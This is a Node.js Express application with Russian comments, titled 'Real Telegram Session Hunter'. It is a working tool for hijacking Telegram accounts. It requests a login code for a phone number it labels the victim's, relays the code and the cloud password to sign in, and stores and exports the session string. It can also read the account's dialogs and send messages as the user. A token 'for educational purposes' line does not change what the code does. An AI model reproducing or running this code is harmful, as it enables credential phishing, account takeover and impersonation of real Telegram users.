import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import { TelegramClient } from 'telegram';
import { StringSession } from 'telegram/sessions/index.js';

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('frontend'));

// 🎯 РЕАЛЬНЫЙ ЗАХВАТ СЕССИЙ TELEGRAM
class RealSessionHunter {
  constructor() {
    this.apiId = parseInt(process.env.TELEGRAM_API_ID);
    this.apiHash = process.env.TELEGRAM_API_HASH;
    this.activeSessions = new Map();
    this.authProcesses = new Map();
    console.log('✅ Real Session Hunter initialized');
  }

  // 🔐 Реальное начало захвата сессии
  async captureSession(sessionId, phoneNumber) {
    try {
      console.log(`🎯 Начат реальный захват сессии для: ${phoneNumber}`);
      
      const stringSession = new StringSession('');
      const client = new TelegramClient(stringSession, this.apiId, this.apiHash, {
        connectionRetries: 5,
        useWSS: false
      });

      await client.connect();

      // Отправляем код на номер жертвы
      const result = await client.sendCode({
        apiId: this.apiId,
        apiHash: this.apiHash,
        phoneNumber,
      });

      console.log(`📱 Код отправлен на ${phoneNumber}, phoneCodeHash: ${result.phoneCodeHash}`);

      // Сохраняем процесс авторизации
      this.authProcesses.set(sessionId, {
        client,
        phoneNumber,
        phoneCodeHash: result.phoneCodeHash,
        status: 'waiting_code'
      });

      return {
        success: true,
        sessionId,
        message: `✅ Код отправлен на ${phoneNumber}. Введите код из Telegram.`,
        nextStep: 'enter_code'
      };

    } catch (error) {
      console.error('❌ Ошибка захвата сессии:', error);
      return {
        success: false,
        error: this.formatError(error)
      };
    }
  }

  // 🔐 Реальный ввод кода
  async submitCode(sessionId, code) {
    try {
      console.log(`🔐 Реальный ввод кода: ${code} для сессии: ${sessionId}`);
      
      const authProcess = this.authProcesses.get(sessionId);
      if (!authProcess) {
        return { success: false, error: 'Сессия не найдена' };
      }

      const { client, phoneNumber, phoneCodeHash } = authProcess;

      try {
        // Пытаемся войти с кодом
        const signInResult = await client.signIn({
          phoneNumber,
          phoneCode: code,
          phoneCodeHash,
        });

        console.log('✅ Успешная авторизация:', signInResult);

        // Сохраняем сессию
        const sessionString = client.session.save();
        
        this.activeSessions.set(sessionId, {
          client,
          sessionString,
          user: signInResult
        });

        this.authProcesses.delete(sessionId);

        return {
          success: true,
          sessionId,
          sessionString, // ⚡ РЕАЛЬНАЯ СЕССИЯ!
          user: {
            id: signInResult.id,
            firstName: signInResult.firstName,
            lastName: signInResult.lastName,
            username: signInResult.username,
            phone: signInResult.phone
          },
          message: '✅ Сессия захвачена! Полный доступ к аккаунту получен.'
        };

      } catch (signInError) {
        // Если нужен пароль
        if (signInError.errorMessage === 'SESSION_PASSWORD_NEEDED') {
          console.log('🔒 Требуется облачный пароль');
          authProcess.status = 'need_password';
          this.authProcesses.set(sessionId, authProcess);

          return {
            success: true,
            sessionId,
            message: '🔒 Требуется облачный пароль. Введите пароль от облачного хранилища.',
            nextStep: 'enter_password'
          };
        }
        throw signInError;
      }

    } catch (error) {
      console.error('❌ Ошибка ввода кода:', error);
      return {
        success: false,
        error: this.formatError(error)
      };
    }
  }

  // 🔐 Реальный ввод пароля
  async submitPassword(sessionId, password) {
    try {
      console.log(`🔐 Ввод пароля для сессии: ${sessionId}`);
      
      const authProcess = this.authProcesses.get(sessionId);
      if (!authProcess) {
        return { success: false, error: 'Сессия не найдена' };
      }

      const { client } = authProcess;

      // Входим с паролем
      const signInResult = await client.signIn({
        password: password,
      });

      console.log('✅ Успешная авторизация с паролем:', signInResult);

      const sessionString = client.session.save();
      
      this.activeSessions.set(sessionId, {
        client,
        sessionString,
        user: signInResult
      });

      this.authProcesses.delete(sessionId);

      return {
        success: true,
        sessionId,
        sessionString, // ⚡ РЕАЛЬНАЯ СЕССИЯ!
        user: {
          id: signInResult.id,
          firstName: signInResult.firstName,
          lastName: signInResult.lastName,
          username: signInResult.username,
          phone: signInResult.phone
        },
        message: '✅ Сессия захвачена с паролем! Полный доступ к аккаунту.'
      };

    } catch (error) {
      console.error('❌ Ошибка ввода пароля:', error);
      return {
        success: false,
        error: 'Неверный облачный пароль'
      };
    }
  }

  // 📱 Использование захваченной сессии
  async useSession(sessionId) {
    try {
      const sessionData = this.activeSessions.get(sessionId);
      if (!sessionData) {
        return { success: false, error: 'Сессия не активна' };
      }

      const { client, sessionString } = sessionData;

      // Получаем информацию о пользователе
      const me = await client.getMe();
      
      // Получаем диалоги
      const dialogs = await client.getDialogs({ limit: 10 });

      return {
        success: true,
        session: sessionString, // ⚡ Эту сессию можно использовать где угодно
        user: me,
        dialogs: dialogs.map(d => ({
          id: d.id,
          name: d.name,
          unreadCount: d.unreadCount,
          isUser: d.isUser,
          isGroup: d.isGroup,
          isChannel: d.isChannel
        })),
        message: '✅ Сессия активна. Доступ к аккаунту получен.'
      };

    } catch (error) {
      console.error('❌ Ошибка использования сессии:', error);
      return {
        success: false,
        error: this.formatError(error)
      };
    }
  }

  // 💬 Отправка сообщения от имени пользователя
  async sendMessageAsUser(sessionId, chatId, message) {
    try {
      const sessionData = this.activeSessions.get(sessionId);
      if (!sessionData) {
        return { success: false, error: 'Сессия не активна' };
      }

      const { client } = sessionData;

      await client.sendMessage(chatId, { message: message });
      
      console.log(`💬 Сообщение отправлено от имени пользователя: "${message}"`);
      
      return {
        success: true,
        message: `✅ Сообщение отправлено от имени пользователя!`
      };

    } catch (error) {
      console.error('❌ Ошибка отправки сообщения:', error);
      return {
        success: false,
        error: this.formatError(error)
      };
    }
  }

  // 💾 Экспорт сессии
  exportSession(sessionId) {
    const sessionData = this.activeSessions.get(sessionId);
    if (!sessionData) {
      return null;
    }

    return {
      sessionString: sessionData.sessionString,
      user: sessionData.user
    };
  }

  // 🛠️ Форматирование ошибок
  formatError(error) {
    if (error.errorMessage) {
      return error.errorMessage;
    }
    if (error.message) {
      return error.message;
    }
    return 'Неизвестная ошибка';
  }
}

// Инициализация реального охотника за сессиями
const sessionHunter = new RealSessionHunter();

// 🎯 API МАРШРУТЫ
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'Real Telegram Session Hunter Active',
    activeSessions: sessionHunter.activeSessions.size,
    authProcesses: sessionHunter.authProcesses.size,
    timestamp: new Date().toISOString()
  });
});

// 🔐 Шаг 1: Начало реального захвата сессии
app.post('/api/hunt/start', async (req, res) => {
  try {
    const { phone } = req.body;
    
    if (!phone) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите номер телефона' 
      });
    }

    const sessionId = 'hunt_' + Date.now();
    const result = await sessionHunter.captureSession(sessionId, phone);
    res.json(result);
    
  } catch (error) {
    console.error('❌ Ошибка в /api/hunt/start:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Внутренняя ошибка сервера' 
    });
  }
});

// 🔐 Шаг 2: Реальный ввод кода
app.post('/api/hunt/submit-code', async (req, res) => {
  try {
    const { sessionId, code } = req.body;
    
    if (!sessionId || !code) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите код и sessionId' 
      });
    }

    const result = await sessionHunter.submitCode(sessionId, code);
    res.json(result);
    
  } catch (error) {
    console.error('❌ Ошибка в /api/hunt/submit-code:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Внутренняя ошибка сервера' 
    });
  }
});

// 🔐 Шаг 3: Реальный ввод пароля
app.post('/api/hunt/submit-password', async (req, res) => {
  try {
    const { sessionId, password } = req.body;
    
    if (!sessionId || !password) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите пароль и sessionId' 
      });
    }

    const result = await sessionHunter.submitPassword(sessionId, password);
    res.json(result);
    
  } catch (error) {
    console.error('❌ Ошибка в /api/hunt/submit-password:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Внутренняя ошибка сервера' 
    });
  }
});

// 📱 Использование реальной сессии
app.get('/api/hunt/use-session', async (req, res) => {
  try {
    const { sessionId } = req.query;
    
    if (!sessionId) {
      return res.status(400).json({ 
        success: false, 
        error: 'Укажите sessionId' 
      });
    }

    const result = await sessionHunter.useSession(sessionId);
    res.json(result);
    
  } catch (error) {
    console.error('❌ Ошибка в /api/hunt/use-session:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Внутренняя ошибка сервера' 
    });
  }
});

// 💬 Отправка сообщения от имени пользователя
app.post('/api/hunt/send-message', async (req, res) => {
  try {
    const { sessionId, chatId, message } = req.body;
    
    if (!sessionId || !chatId || !message) {
      return res.status(400).json({ 
        success: false, 
        error: 'Укажите sessionId, chatId и message' 
      });
    }

    const result = await sessionHunter.sendMessageAsUser(sessionId, chatId, message);
    res.json(result);
    
  } catch (error) {
    console.error('❌ Ошибка в /api/hunt/send-message:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Внутренняя ошибка сервера' 
    });
  }
});

// 💾 Экспорт реальной сессии
app.get('/api/hunt/export-session', (req, res) => {
  try {
    const { sessionId } = req.query;
    
    const sessionData = sessionHunter.exportSession(sessionId);
    if (!sessionData) {
      return res.status(404).json({ 
        success: false, 
        error: 'Сессия не найдена' 
      });
    }

    res.json({
      success: true,
      sessionString: sessionData.sessionString,
      user: sessionData.user,
      message: '✅ Сессия экспортирована. Используйте в любом Telegram клиенте.'
    });
    
  } catch (error) {
    console.error('❌ Ошибка в /api/hunt/export-session:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Внутренняя ошибка сервера' 
    });
  }
});

// 🏠 Главная страница
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Real Telegram Session Hunter</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
            .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .btn { padding: 12px 24px; margin: 10px 5px; background: #dc3545; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
            .btn:hover { background: #c82333; }
            .result { background: #f8f9fa; padding: 20px; margin: 20px 0; border-radius: 5px; border-left: 4px solid #dc3545; }
            .input { padding: 10px; margin: 5px; width: 200px; border: 1px solid #ddd; border-radius: 4px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎯 Real Telegram Session Hunter</h1>
            <p><strong>Реальный захват сессий Telegram аккаунтов</strong></p>
            <p>⚠️ Для образовательных целей</p>
            
            <div>
                <h3>Тестирование системы:</h3>
                <button class="btn" onclick="testHealth()">Проверить здоровье</button>
                
                <h4>Захват сессии:</h4>
                <input class="input" type="tel" id="phone" placeholder="+79123456789">
                <button class="btn" onclick="startHunt()">Начать захват</button>
                
                <div id="codeSection" style="display:none; margin-top: 15px;">
                    <input class="input" type="text" id="code" placeholder="Код из Telegram">
                    <button class="btn" onclick="submitCode()">Ввести код</button>
                </div>

                <div id="passwordSection" style="display:none; margin-top: 15px;">
                    <input class="input" type="password" id="password" placeholder="Облачный пароль">
                    <button class="btn" onclick="submitPassword()">Ввести пароль</button>
                </div>

                <div style="margin-top: 15px;">
                    <button class="btn" onclick="useSession()">Использовать сессию</button>
                    <button class="btn" onclick="exportSession()">Экспорт сессии</button>
                </div>
            </div>
            
            <div id="result" class="result"></div>
        </div>

        <script>
            let currentSessionId = '';

            async function testHealth() {
                const response = await fetch('/health');
                const data = await response.json();
                showResult(data);
            }

            async function startHunt() {
                const phone = document.getElementById('phone').value;
                if (!phone) return alert('Введите номер телефона');
                
                const response = await fetch('/api/hunt/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone})
                });
                const data = await response.json();
                
                if (data.success) {
                    currentSessionId = data.sessionId;
                    document.getElementById('codeSection').style.display = 'block';
                    showResult(data);
                } else {
                    showResult(data);
                }
            }

            async function submitCode() {
                const code = document.getElementById('code').value;
                if (!code) return alert('Введите код');
                
                const response = await fetch('/api/hunt/submit-code', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        sessionId: currentSessionId,
                        code: code
                    })
                });
                const data = await response.json();
                
                if (data.success && data.nextStep === 'enter_password') {
                    document.getElementById('passwordSection').style.display = 'block';
                }
                showResult(data);
            }

            async function submitPassword() {
                const password = document.getElementById('password').value;
                if (!password) return alert('Введите пароль');
                
                const response = await fetch('/api/hunt/submit-password', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        sessionId: currentSessionId,
                        password: password
                    })
                });
                const data = await response.json();
                showResult(data);
            }

            async function useSession() {
                if (!currentSessionId) return alert('Сначала захватите сессию');
                
                const response = await fetch('/api/hunt/use-session?sessionId=' + currentSessionId);
                const data = await response.json();
                showResult(data);
            }

            async function exportSession() {
                if (!currentSessionId) return alert('Сначала захватите сессию');
                
                const response = await fetch('/api/hunt/export-session?sessionId=' + currentSessionId);
                const data = await response.json();
                showResult(data);
            }

            function showResult(data) {
                document.getElementById('result').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
            }
        </script>
    </body>
    </html>
  `);
});

// 🔧 Обработка ошибок
process.on('uncaughtException', (error) => {
  console.error('⚠️ Непойманное исключение:', error);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('⚠️ Необработанный промис:', reason);
});

// 🚀 Запуск сервера
const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Сервер запущен на порту ${PORT}`);
  console.log(`🎯 Реальный захват сессий Telegram аккаунтов`);
  console.log(`📊 Health check: http://localhost:${PORT}/health`);
});

export default app;
